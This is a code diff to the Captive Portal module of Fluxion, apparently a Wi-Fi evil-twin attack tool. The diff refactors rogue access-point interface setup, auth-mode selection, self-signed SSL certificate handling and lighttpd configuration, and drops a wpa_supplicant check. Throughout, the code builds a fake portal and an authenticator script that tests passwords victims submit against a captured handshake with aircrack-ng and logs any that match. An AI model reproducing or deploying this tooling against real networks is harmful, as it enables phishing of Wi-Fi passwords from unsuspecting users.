@@ -15,6 +15,33 @@ CaptivePortalAuthenticationMethodsInfo=("(handshake file, ${CGrn}recommended$CCl
 VIGWAddress="192.168.254.1"
 VIGWNetwork=${VIGWAddress%.*}
 
+function captive_portal_run_interface() {
+	if [ ! "$1" ]; then return 1; fi
+
+	# Create an identifier for the access point, AP virtual interface.
+	local wiAccessPoint="FX${1:2}AP"
+
+	# Find interface's physical device.
+	if ! interface_physical "$1"
+		then echo -e "$FLUXIONVLine $FLUXIONPhysicalWIDeviceUnknownError"; sleep 5; return 1
+	fi
+
+	local wiAccessPointDevice="$InterfacePhysical"
+
+	# Create the new virtual interface with the generated identifier.
+	echo -e "$FLUXIONVLine $CaptivePortalStartingInterfaceNotice"
+	if ! iw phy $wiAccessPointDevice interface add $wiAccessPoint type monitor 2> $FLUXIONOutputDevice; then
+		echo -e "$FLUXIONVLine $CaptivePortalCannotStartInterfaceError"
+		sleep 5
+		return 3
+	fi
+
+	echo -e "$FLUXIONVLine $CaptivePortalStartedInterfaceNotice"
+	sleep 3
+
+	CaptivePortalRunInterface="$wiAccessPoint"
+}
+
 function captive_portal_unset_interface() {
 	if [ ! "$WIAccessPoint" ]; then return 1; fi
 
@@ -50,8 +77,7 @@ function captive_portal_set_interface() {
 	ifAlternate[@] ifAlternateInfo[@] ifAlternateState[@] ifAlternateColor[@]
 
 	case "$InterfacePromptIfSelected" in
-		"$FLUXIONGeneralBackOption")
-			captive_portal_unset_interface; fluxion_unset_attack; return 1;;
+		"$FLUXIONGeneralBackOption") captive_portal_unset_interface; return 1;;
 
 		# If the monitor interface is also the AP interface,
 		# there's no need to reserve it again, just add it.
@@ -87,45 +113,18 @@ function captive_portal_set_interface() {
 	fi
 }
 
-function captive_portal_run_interface() {
-	if [ ! "$1" ]; then return 1; fi
-
-	# Create an identifier for the access point, AP virtual interface.
-	local wiAccessPoint="FX${1:2}AP"
-
-	# Find interface's physical device.
-	if ! interface_physical "$1"
-		then echo -e "$FLUXIONVLine $FLUXIONPhysicalWIDeviceUnknownError"; sleep 5; return 1
-	fi
-
-	local wiAccessPointDevice="$InterfacePhysical"
-
-	# Create the new virtual interface with the generated identifier.
-	echo -e "$FLUXIONVLine $CaptivePortalStartingInterfaceNotice"
-	if ! iw phy $wiAccessPointDevice interface add $wiAccessPoint type monitor 2> $FLUXIONOutputDevice; then
-		echo -e "$FLUXIONVLine $CaptivePortalCannotStartInterfaceError"
-		sleep 5
-		return 3
-	fi
-
-	echo -e "$FLUXIONVLine $CaptivePortalStartedInterfaceNotice"
-	sleep 3
-
-	CaptivePortalRunInterface="$wiAccessPoint"
-}
-
 function captive_portal_unset_auth() {
 	if [ ! "$APRogueAuthMode" ]; then return 0; fi
 
-	if [ "$APRogueAuthMode" = "hash" ]; then
-		fluxion_unset_hash
-	fi
+	case "$APRogueAuthMode" in
+		"hash") fluxion_unset_hash;;
+	esac
 
 	APRogueAuthMode=""
 
-	# If we've only got one option, then the user skipped this
-	# section by taking that one option, so we unset the previous
-	# phase along with this one to take the user properly back.
+	# If we've only got one option, then the user skipped this section
+	# by auto-selecting that single option, so we unset the previous
+	# phase along with this one to properly take the user back.
 	if [ ${#CaptivePortalAuthenticationMethods[@]} -le 1 ]; then
 		captive_portal_unset_interface
 	fi
@@ -134,14 +133,16 @@ function captive_portal_unset_auth() {
 function captive_portal_set_auth() {
 	if [ "$APRogueAuthMode" ]; then
 		echo "Captive Portal authentication mode is already set, skipping!" > $FLUXIONOutputDevice
-		return 0;
+		return 0
 	fi
 
 	captive_portal_unset_auth
 
+	# If we've got only one choice, auto-select it for the user.
 	if [ ${#CaptivePortalAuthenticationMethods[@]} -eq 1 -o \
 		 ${#CaptivePortalAuthenticationMethods[@]} -ge 1 -a "$FLUXIONAuto" ]; then
 		APRogueAuthMode="${CaptivePortalAuthenticationMethods[0]}"
+		echo "Auto-selected authentication method: $APRogueAuthMode" > $FLUXIONOutputDevice
 	else
 		fluxion_header
 
@@ -158,17 +159,22 @@ function captive_portal_set_auth() {
 
 		APRogueAuthMode="${IOQueryFormatFields[0]}"
 
-		if [[ "$APRogueAuthMode" = "$FLUXIONGeneralBackOption" ]]; then
-			captive_portal_unset_auth
-			return 1
+		# If we're going back, reset everything and abort.
+		if [[ "$APRogueAuthMode" = "$FLUXIONGeneralBackOption" ]]
+			then captive_portal_unset_auth; return 1
 		fi
 	fi
 
-	if [ "$APRogueAuthMode" = "hash" ]; then
-		fluxion_set_hash
-	fi
+	# Process the authentication method selected.
+	captive_portal_set_auth_processingResult=1 # Assume failure.
+	case "$APRogueAuthMode" in
+		"hash") fluxion_set_hash; captive_portal_set_auth_processingResult=$?;;
+	esac
 
-	if [[ $? -ne 0 ]]; then captive_portal_unset_auth; return 1; fi
+	# Assure authentication method processing was successful, abort otherwise.
+	if [[ $captive_portal_set_auth_processingResult -ne 0 ]]
+		then captive_portal_unset_auth; return 1;
+	fi
 }
 
 function captive_portal_run_certificate_generator() {
@@ -178,45 +184,61 @@ function captive_portal_run_certificate_generator() {
 
 function captive_portal_unset_cert() {
 	sandbox_remove_workfile "$FLUXIONWorkspacePath/server.pem"
+	CaptivePortalSSL=""
 }
 
 # Create Self-Signed SSL Certificate
 function captive_portal_set_cert() {
-	# Check existance of ssl certificate with file size > 0
-	if [ -f "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" -a \
-		 -s "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" ]; then
-		cp "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
-		   "$FLUXIONWorkspacePath/server.pem"
-	fi
-
-	# Check existance of ssl certificate with file size > 0
-	if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]; then
-		echo "Captive Portal certificate is already set, skipping!" > $FLUXIONOutputDevice
-		return 0;
+	if [ "$CaptivePortalSSL" ]; then
+		echo "Captive Portal SSL mode already set to $CaptivePortalSSL!" > $FLUXIONOutputDevice
+		return 0
 	fi
 
 	captive_portal_unset_cert
 
+	# Check for existance of ssl certificate within fluxion with file size > 0
+	# If a certificate exists, it's user supplied (fancy), copy it to fluxspace.
+	if [ -f "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" -a \
+		 -s "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" ]; then
+		cp "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
+		   "$FLUXIONWorkspacePath/server.pem"
+
+		CaptivePortalSSL="enabled" # Must be enabled if sourcing own certificate
+
+		echo "Captive Portal certificate was user supplied, skipping query!" > $FLUXIONOutputDevice
+		return 0;
+	fi
+
 	if [ "$FLUXIONAuto" ]; then
-		captive_portal_run_certificate_generator
+		# If cert generator fails, gtfo, something broke!
+		if ! captive_portal_run_certificate_generator
+			then fluxion_conditional_bail "cert-gen failed!"; return 2
+		fi
+		CaptivePortalSSL="enabled"
 	else
-		local choices=("$CaptivePortalCertificateSourceGenerateOption" "$CaptivePortalCertificateSourceRescanOption" "$FLUXIONGeneralBackOption")
+		local choices=("$CaptivePortalCertificateSourceGenerateOption" "$CaptivePortalCertificateSourceRescanOption" "$CaptivePortalCertificateSourceDisabledOption" "$FLUXIONGeneralBackOption")
 
-		while [ ! -f "$FLUXIONWorkspacePath/server.pem" -o ! -s "$FLUXIONWorkspacePath/server.pem" ]; do
-			io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]
+		io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]
 
-			echo
+		echo
 
-			case "$IOQueryChoice" in
-				"$CaptivePortalCertificateSourceGenerateOption") captive_portal_run_certificate_generator; break;;
-				"$CaptivePortalCertificateSourceRescanOption") return 2;;
-				"$FLUXIONGeneralBackOption")
-					captive_portal_unset_auth
-					captive_portal_unset_cert
-					return 1;;
-				*) conditional_bail; return 3;;
-			esac
-		done
+		case "$IOQueryChoice" in
+			"$CaptivePortalCertificateSourceGenerateOption")
+				# If cert generator fails, gtfo, something broke!
+				if ! captive_portal_run_certificate_generator
+					then fluxion_conditional_bail "cert-gen failed!"; return 2
+				fi
+				CaptivePortalSSL="enabled";;
+
+			"$CaptivePortalCertificateSourceRescanOption")
+				captive_portal_set_cert; return $?;;
+
+			"$CaptivePortalCertificateSourceDisabledOption")
+				captive_portal_unset_cert; CaptivePortalSSL="disabled";;
+
+			"$FLUXIONGeneralBackOption") captive_portal_unset_cert; return 1;;
+			*) fluxion_conditional_bail "Unknown cert-gen option!"; return 2;;
+		esac
 	fi
 }
 
@@ -280,7 +302,6 @@ function captive_portal_set_site() {
 			source "$FLUXIONPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
 			captive_portal_generic;;
 		"$FLUXIONGeneralBackOption")
-			captive_portal_unset_cert
 			captive_portal_unset_site
 			return 1;;
 		* )
@@ -403,12 +424,19 @@ index-file.names = (
 	\"index.html\",
     \"index.php\"
 )
+" > "$FLUXIONWorkspacePath/lighttpd.conf"
 
-#\$SERVER[\"socket\"] == \":443\" {
-#	ssl.engine = \"enable\"
-#	ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
-#}
+	# Configure lighttpd's SSL only if we've got a certificate and its key.
+	if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]; then
+		echo "\
+\$SERVER[\"socket\"] == \":443\" {
+	ssl.engine = \"enable\"
+	ssl.pemfile = \"$FLUXIONWorkspacePath/server.pem\"
+}
+" >> "$FLUXIONWorkspacePath/lighttpd.conf"
+	fi
 
+	echo "\
 # Redirect www.domain.com to domain.com
 #\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
 #	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
@@ -447,7 +475,7 @@ index-file.names = (
 	server.document-root = \"$FLUXIONWorkspacePath/captive_portal/connectivity_responses/Google/\"
 	url.rewrite-once = ( \"^/generate_204\$\" => \"generate_204.php\" )
 }
-" > "$FLUXIONWorkspacePath/lighttpd.conf"
+" >> "$FLUXIONWorkspacePath/lighttpd.conf"
 
 
 	# Create a DNS service with python, forwarding all traffic to gateway.
@@ -585,25 +613,6 @@ while [ \$AuthenticatorState = \"running\" ]; do
 			echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
 		fi
 	fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
-	elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
-		echo "
-	wpa_passphrase \"$APTargetSSID\" \"\`cat \"$FLUXIONWorkspacePath/candidate.txt\"\`\" > \"$FLUXIONWorkspacePath/wpa_supplicant.conf\"
-	wpa_supplicant -i \"$WIAccessPoint\" -c \"$FLUXIONWorkspacePath/wpa_supplicant.conf\" -f \"$FLUXIONWorkspacePath/wpa_supplicant.log\" &
-	wpaSupplicantPID=\$!
-
-	# Shitty design...
-	sleep 5
-
-	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
-		if grep -i 'WPA: Key negotiation completed' \"$FLUXIONWorkspacePath/wpa_supplicant.log\"; then
-			echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
-			break
-		else
-			echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
-		fi
-	fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
 	fi
 
 	echo "
@@ -649,12 +658,6 @@ while [ \$AuthenticatorState = \"running\" ]; do
 	if [ $APRogueAuthMode = "hash" ]; then
 		echo "
 	sleep 1" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
-	elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
-		echo "
-	killall \$wpaSupplicantPID &> $FLUXIONOutputDevice
-" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
 	fi
 
 	echo "
@@ -706,12 +709,6 @@ Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
 		echo "
 aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log"$CClr"\"\
 " >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
-	elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
-		echo "
-echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log"$CClr"\"\
-" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
-
 	fi
 
 	chmod +x "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
@@ -940,11 +937,19 @@ function unprep_attack() {
 
 function prep_attack() {
 	while true; do
-		captive_portal_set_interface; 	if [ $? -ne 0 ]; then break; fi
-		captive_portal_set_auth; 		if [ $? -ne 0 ]; then continue; fi
-		captive_portal_set_cert; 		if [ $? -ne 0 ]; then continue; fi
-		captive_portal_set_site; 		if [ $? -ne 0 ]; then continue; fi
-		captive_portal_set_attack; 		if [ $? -ne 0 ]; then continue; fi
+		captive_portal_set_interface; if [ $? -ne 0 ]; then break; fi
+		captive_portal_set_auth; if [ $? -ne 0 ]; then
+			captive_portal_unset_interface; continue
+		fi
+		captive_portal_set_cert; if [ $? -ne 0 ]; then
+			captive_portal_unset_auth; continue
+		fi
+		captive_portal_set_site; if [ $? -ne 0 ]; then
+			captive_portal_unset_cert; continue
+		fi
+		captive_portal_set_attack; if [ $? -ne 0 ]; then
+			captive_portal_unset_site; continue
+		fi
 		CaptivePortalState="Ready"
 		break
 	done
